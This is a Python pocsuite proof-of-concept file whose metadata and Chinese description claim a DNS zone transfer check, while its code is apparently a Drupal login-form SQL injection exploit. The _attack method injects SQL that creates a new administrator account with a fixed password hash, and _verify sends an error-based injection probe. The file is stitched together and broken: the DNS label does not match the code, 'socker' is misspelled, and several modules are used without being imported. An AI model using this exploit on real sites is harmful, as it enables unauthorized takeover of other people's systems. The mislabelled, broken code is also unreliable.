#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pocsuite.api.request import req  # 用法和 requests 完全相同
from pocsuite.api.poc import register
from pocsuite.api.poc import Output, POCBase
import socker
from dns import resolver, query, exception


class DNS_transforPoc(POCBase):
    vulID = "0"
    version = "1"
    author = "akame"
    vulDate = "2017-8-12"
    createDate = "2017-8-12"
    updateDate = "2017-8-12"
    # 漏洞地址来源,0day不用写
    references = ['http://www.lijiejie.com/dns-zone-transfer-3/']
    name = 'Dns Transfor  DNS域传送 PoC'  # PoC 名称
    appPowerLink = 'None'  # 漏洞厂商主页地址
    appName = 'dns'  # 漏洞应用名称
    appVersion = '*.x'  # 漏洞影响版本
    vulType = 'Information Disclosure'  # 漏洞类型,类型参考见 漏洞类型规范表
    desc = '''
        若DNS服务器配置不当，可能导致匿名用户获取某个域的所有记录。
        造成整个网络的拓扑结构泄露给潜在的攻击者，包括一些安全性较低的内部主机，如测试服务器。
        凭借这份网络蓝图，攻击者可以节省很少的扫描时间。
       大的互联网厂商通常将内部网络与外部互联网隔离开，
       一个重要的手段是使用Private DNS。如果内部DNS泄露，将造成极大的安全风险。风险控制不当甚至造成整个内部网络沦陷。
    '''  # 漏洞简要描述
    samples = []  # 测试样列,就是用 PoC 测试成功的网站
    install_requires = [ 'socket', 'dnspython']  # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写

    def _attack(self):
        result = {}
        vul_url = '%s/?q=node&destination=node' % self.url
        uid = int(random.random() * 1000)
        username = ''.join(random.sample(string.letters+string.digits, 5))
        payload = OrderedDict()

        if not self._verify(verify=False):
            return self.parse_attack(result)

        payload['name[0;insert into users(uid, name, pass, status, data) values (%d, \'%s\', ' \
                '\'$S$DkIkdKLIvRK0iVHm99X7B/M8QC17E1Tp/kMOd1Ie8V/PgWjtAZld\', 1, \'{b:0;}\');' \
                'insert into users_roles(uid, rid) values (%d, 3);#]' % (uid, username, uid)] \
                 = 'test'
        payload['name[0]'] = 'test2'
        payload['pass'] = 'test'
        payload['form_id'] = 'user_login_block'

        #print urllib.urlencode(payload)
        response = req.post(vul_url, data=payload)
        if response.status_code == 200:
            result['AdminInfo'] = {}
            result['AdminInfo']['Username'] = username
            result['AdminInfo']['Password'] = 'thanks'

        return self.parse_attack(result)

    def _verify(self, verify=True):
        result = {}
        vul_url = '%s/?q=node&destination=node' % self.url
        payload = {
            'name[0 and (select 1 from (select count(*),concat((select md5(715890248' \
                '135)),floor(rand(0)*2))x from  information_schema.tables group by x' \
                ')a);;#]': 'test',
            'name[0]': 'test2',
            'pass': 'test',
            'form_id': 'user_login_block',
        }

        response = req.post(vul_url, data=payload).content
        if 'e4f5fd37a92eb41ba575c81bf0d31591' in response:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = self.url
            result['VerifyInfo']['Payload'] = urllib.urlencode(payload)

        return self.parse_attack(result)

    def parse_attack(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output

register(DNS_transforPoc)
